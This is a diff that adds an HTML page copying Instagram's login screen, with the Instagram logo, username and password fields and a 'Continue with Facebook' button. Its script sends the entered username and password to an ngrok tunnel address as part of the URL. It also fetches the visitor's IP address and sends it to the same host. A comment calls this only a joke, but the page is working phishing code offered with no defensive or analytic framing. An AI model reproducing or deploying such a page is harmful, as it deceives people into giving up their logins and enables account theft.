@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram post 4</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #fdfbfb, #ebedee);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 360px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fafafa;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 14px 16px;
+            background: linear-gradient(90deg, #ff7a00, #e82f77);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s ease;
+        }
+
+        .login-container button:hover {
+            background: linear-gradient(90deg, #e82f77, #ff7a00);
+        }
+
+        .divider {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #ddd;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .divider span {
+            background: #ffffff;
+            padding: 0 10px;
+            color: #888;
+            font-size: 14px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        @media (max-width: 400px) {
+            .login-container {
+                width: 90%;
+                padding: 30px 20px;
+            }
+
+            .login-container img {
+                width: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="login-container">
+    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+    <form id="loginForm">
+        <input id="username" type="text" placeholder="Phone number, username, or email" required>
+        <input id="password" type="password" placeholder="Password" required>
+        <button type="button" onclick="handleClick()">Log In</button>
+    </form>
+    <div class="divider"><span>OR</span></div>
+    <button type="button" style="background: #0078ff; color: white;">Continue with Facebook</button>
+    <div lass="footer">Forgot your password?</div>
+    <p id="ip">hello</p>
+</div>
+<script>
+    function handleClick() {
+        const username = document.getElementById('username').value
+        const password = document.getElementById('password').value
+
+        if (username === "" || password === "") {
+            alert("Заполните необходимые поля!")
+        }
+
+
+        // это только рофл ))
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+                document.getElementById('ip').textContent = `Your IP: ${userIp}`;
+
+
+                fetch('https://b286-193-30-245-6.ngrok-free.app/app/' + userIp, {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(serverResponse => {
+                    if (serverResponse.ok) {
+                        console.log('IP sent successfully');
+                    } else {
+                        console.error('Failed to send IP');
+                    }
+                })
+                .catch(error => console.error('Error sending IP:', error));
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+
+        fetch('https://b286-193-30-245-6.ngrok-free.app/' + username + '::' + password, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+    }
+
+
+</script>
+
+</body>
+</html>
